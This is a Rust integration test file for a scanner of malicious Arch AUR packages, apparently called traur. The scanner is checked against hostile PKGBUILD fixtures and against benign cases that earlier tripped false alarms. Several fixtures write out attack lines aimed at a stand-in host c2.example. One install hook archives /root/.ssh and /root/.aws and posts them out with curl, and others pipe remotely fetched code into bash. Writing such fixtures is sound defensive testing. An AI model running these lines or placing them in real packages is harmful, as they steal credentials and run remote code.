//! Integration tests for the behaviours that were silent before this release.
//!
//! Each test here corresponds to something that either scored a malicious
//! package as TRUSTED or reported a false verdict. They go through
//! `local_scan` + `run_analysis`, which is the same path the CLI, the
//! `makepkg` wrapper and the AUR hook use.

use std::path::PathBuf;
use traur::coordinator;
use traur::shared::local_scan;
use traur::shared::scoring::{ScanStatus, SignalRole, Tier};

/// Materialise a package directory from (name, content) pairs.
fn pkg(name: &str, files: &[(&str, &str)]) -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "traur-it-{}-{}",
        std::process::id(),
        name
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    for (f, c) in files {
        let path = dir.join(f);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, c).unwrap();
    }
    dir
}

fn scan(dir: &std::path::Path, name: &str) -> traur::shared::scoring::ScanResult {
    let loaded = local_scan::load_dir(name, dir).expect("load");
    coordinator::run_analysis(&loaded.context)
}

const HEADER: &str = "pkgver=1.0\npkgrel=1\narch=('x86_64')\nurl='https://github.com/legit/x'\nlicense=('MIT')\n";

// --- The two silent bypasses -------------------------------------------------

#[test]
fn install_hook_exfiltration_is_not_trusted() {
    // Was 89/100 TRUSTED: the .install script pacman runs as root was never
    // analysed because `read_install_script` only looked for `install=`.
    let dir = pkg(
        "install-exfil",
        &[
            (
                "PKGBUILD",
                &format!(
                    "pkgname=install-exfil\npkgdesc='tool'\n{HEADER}install=install-exfil.install\nsource=('https://github.com/legit/x/a.tar.gz')\nsha256sums=('SKIP')\nbuild() {{ make; }}\n"
                ),
            ),
            (
                "install-exfil.install",
                "post_install() {\n  tar czf - /root/.ssh /root/.aws | base64 -w0 | xargs -I{} curl -s -d {} https://c2.example/c\n}\n",
            ),
        ],
    );
    let result = scan(&dir, "install-exfil");
    assert_eq!(result.tier, Tier::Malicious, "got {:?}", result.signals);
    assert_eq!(
        result.override_gate_fired.as_deref(),
        Some("IS-SA-EXFIL-PIPE")
    );
}

#[test]
fn committed_source_file_payload_is_not_trusted() {
    // Was 100/100 TRUSTED: `source=()` entries land in $srcdir and build() can
    // source them, which nothing analysed.
    let dir = pkg(
        "sourced-payload",
        &[
            (
                "PKGBUILD",
                &format!(
                    "pkgname=sourced-payload\npkgdesc='tool'\n{HEADER}source=('https://github.com/legit/x/a.tar.gz' 'config.defaults')\nsha256sums=('SKIP' 'abc')\nbuild() {{ cd \"$srcdir\"; source ../config.defaults; make; }}\n"
                ),
            ),
            (
                "config.defaults",
                "_p=\"$(curl -s https://c2.example/r | base64 -d | bash)\"\n",
            ),
        ],
    );
    let result = scan(&dir, "sourced-payload");
    assert_eq!(result.tier, Tier::Malicious, "got {:?}", result.signals);
    assert!(
        result
            .signals
            .iter()
            .any(|s| s.id.starts_with("LS-") && s.is_override_gate),
        "local source finding must gate: {:?}",
        result.signals
    );
}

// --- False positives that users reported -------------------------------------

#[test]
fn shipped_systemd_unit_is_a_fact_not_a_finding() {
    // llama.cpp-vulkan shape: the standard way to package a unit file.
    let dir = pkg(
        "unit-shipper",
        &[(
            "PKGBUILD",
            &format!(
                "pkgname=unit-shipper\npkgdesc='tool'\n{HEADER}source=('https://github.com/legit/x/a.tar.gz')\nsha256sums=('abc')\nbuild() {{ make; }}\npackage() {{ install -Dm644 llama.service \"$pkgdir/usr/lib/systemd/system/llama.service\"; }}\n"
            ),
        )],
    );
    let result = scan(&dir, "unit-shipper");
    assert_eq!(result.tier, Tier::Trusted);
    let unit = result
        .signals
        .iter()
        .find(|s| s.id == "P-SYSTEMD-CREATE")
        .expect("still reported");
    assert_eq!(unit.role, SignalRole::Fact, "lifecycle facts never add risk");
}

#[test]
fn checksum_array_cannot_trigger_a_wallet_signal() {
    // google-chrome #27: a sha512 happened to contain a Monero-shaped run.
    let dir = pkg(
        "hash-noise",
        &[(
            "PKGBUILD",
            &format!(
                "pkgname=hash-noise\npkgdesc='browser'\n{HEADER}source=('https://github.com/legit/x/a.deb')\nsha512sums=('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq88ff9')\nbuild() {{ :; }}\n"
            ),
        )],
    );
    let result = scan(&dir, "hash-noise");
    assert!(
        !result.signals.iter().any(|s| s.id == "P-CRYPTO-WALLET"),
        "checksum data must not be matched: {:?}",
        result.signals
    );
    assert_eq!(result.tier, Tier::Trusted);
}

#[test]
fn eval_of_a_version_variable_is_benign_but_remote_eval_is_not() {
    let benign = pkg(
        "eval-benign",
        &[(
            "PKGBUILD",
            &format!(
                "pkgname=eval-benign\npkgdesc='compiler'\n{HEADER}source=('https://github.com/legit/x/a.tar.gz')\nsha256sums=('abc')\nbuild() {{ eval \"$pkgver\"; }}\n"
            ),
        )],
    );
    let result = scan(&benign, "eval-benign");
    assert_eq!(result.tier, Tier::Trusted, "got {:?}", result.signals);

    let hostile = pkg(
        "eval-hostile",
        &[(
            "PKGBUILD",
            &format!(
                "pkgname=eval-hostile\npkgdesc='compiler'\n{HEADER}source=('https://github.com/legit/x/a.tar.gz')\nsha256sums=('SKIP')\nbuild() {{ eval \"$(curl -s https://c2.example/s | base64 -d | bash)\"; }}\n"
            ),
        )],
    );
    let result = scan(&hostile, "eval-hostile");
    assert_eq!(result.tier, Tier::Malicious, "got {:?}", result.signals);
}

#[test]
fn variant_suffixes_are_not_typosquats() {
    for name in ["slack-desktop-wayland", "vim-git", "proton-ge-custom-bin"] {
        let dir = pkg(
            &name.replace('.', "-"),
            &[(
                "PKGBUILD",
                &format!("pkgname={name}\npkgdesc='variant'\n{HEADER}"),
            )],
        );
        let result = scan(&dir, name);
        assert!(
            !result
                .signals
                .iter()
                .any(|s| s.id == "B-TYPOSQUAT" && s.description.contains("embeds")),
            "{name} is a legitimate variant: {:?}",
            result.signals
        );
    }
}

// --- The Unknown state -------------------------------------------------------

#[test]
fn an_unreadable_pkgbuild_is_unknown_never_trusted() {
    let dir = pkg("broken", &[("PKGBUILD", "")]);
    let loaded = local_scan::load_dir("broken", &dir).unwrap();
    let mut ctx = loaded.context;
    ctx.incomplete = vec!["PKGBUILD unreadable: simulated".into()];
    let result = coordinator::run_analysis(&ctx);
    assert_eq!(result.tier, Tier::Unknown);
    assert_ne!(result.tier, Tier::Trusted);
    assert_ne!(result.tier, Tier::Suspicious);
    assert_eq!(result.status, ScanStatus::Incomplete);
}

#[test]
fn unknown_never_masks_a_known_malicious_verdict() {
    // An incomplete scan reports Unknown, but the signals it did find are kept
    // so the hook can still refuse to excuse a locally detected gate.
    let dir = pkg(
        "partial-gate",
        &[(
            "PKGBUILD",
            &format!(
                "pkgname=partial-gate\npkgdesc='x'\n{HEADER}source=('https://github.com/legit/x/a.tar.gz')\nsha256sums=('SKIP')\nbuild() {{ curl -s https://c2.example/p | base64 -d | bash; }}\n"
            ),
        )],
    );
    let loaded = local_scan::load_dir("partial-gate", &dir).unwrap();
    let mut ctx = loaded.context;
    ctx.incomplete = vec!["AUR unreachable".into()];
    let result = coordinator::run_analysis(&ctx);
    assert_eq!(result.tier, Tier::Unknown);
    assert!(
        result.signals.iter().any(|s| s.is_override_gate),
        "the gate must survive so it can be reported"
    );
}

#[test]
fn unresolved_install_script_is_reported() {
    let dir = pkg(
        "missing-install",
        &[(
            "PKGBUILD",
            &format!(
                "pkgname=missing-install\npkgdesc='x'\n{HEADER}install=\"$pkgname.install\"\nsource=('https://github.com/legit/x/a.tar.gz')\nsha256sums=('SKIP')\nbuild() {{ :; }}\n"
            ),
        )],
    );
    let result = scan(&dir, "missing-install");
    assert!(
        result.signals.iter().any(|s| s.id == "P-INSTALL-UNRESOLVED"),
        "got {:?}",
        result.signals
    );
    assert_eq!(result.tier, Tier::Ok, "an anomaly, not a verdict");
}


#[test]
fn unknown_output_reads_as_inconclusive() {
    // The report must not invite reading "unsure" as a verdict either way.
    let dir = pkg("unknown-print", &[("PKGBUILD", "pkgname=unknown-print\n")]);
    let loaded = local_scan::load_dir("unknown-print", &dir).unwrap();
    let mut ctx = loaded.context;
    ctx.incomplete = vec!["AUR unreachable — network failure; scan incomplete".into()];
    let result = coordinator::run_analysis(&ctx);

    colored::control::set_override(false);
    let mut buf = Vec::new();
    traur::shared::output::write_text(&mut buf, &result, false);
    let text = String::from_utf8(buf).unwrap();

    assert!(text.contains("UNSAFE-TO-CONCLUDE"), "{text}");
    assert!(text.contains("could not conclude"), "{text}");
    assert!(text.contains("not a verdict"), "{text}");
    assert!(!text.contains("TRUSTED"), "must not read as trusted: {text}");
    assert!(!text.contains("SUSPICIOUS"), "must not read as suspicious: {text}");
}


// --- Robustness: the detector runs inside the pacman transaction -------------
//
// A panic here aborts an install, so malformed and hostile input must never
// panic. These two cases were found by fuzzing and both were byte/char offset
// bugs that only trigger on non-ASCII input.

#[test]
fn non_ascii_input_does_not_panic_in_checksum_analysis() {
    let dir = pkg(
        "utf8-checksum",
        &[(
            "PKGBUILD",
            "pkgname=utf8\npkgdesc='fixes для браузера'\nsource=('a')\nsha256sums=('é' 'ъ')\nbuild() { echo \"é #x\"; }\n",
        )],
    );
    let result = scan(&dir, "utf8-checksum");
    assert!(result.score <= 100);
}

#[test]
fn trailing_backslash_in_eval_does_not_panic() {
    let dir = pkg(
        "eval-backslash",
        &[(
            "PKGBUILD",
            "pkgname=bs\nsource=('a')\nsha256sums=('SKIP')\nbuild() { eval \"ab\\",
        )],
    );
    let result = scan(&dir, "eval-backslash");
    assert!(result.score <= 100);
}
